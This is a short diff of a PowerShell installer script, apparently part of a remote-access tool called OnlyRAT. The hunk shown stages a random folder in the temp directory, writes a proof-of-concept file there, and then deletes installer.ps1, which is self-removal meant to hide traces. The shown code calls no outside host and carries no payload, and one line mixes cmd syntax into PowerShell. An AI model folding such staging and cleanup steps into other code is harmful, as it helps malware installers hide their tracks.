@@ -4,11 +4,14 @@ function random_text {
 
 $wd = random_text
 $path = "$env:temp/$wd"
+$initial_dir = %cd%
 
 mkdir $path
 cd $path
 
 echo "" > poc.txt
 
-cd "C:\Users\Loubna Mellouki\Documents\OnlyRAT\files"
+cd $initial_dir
+
+del installer.ps1
 
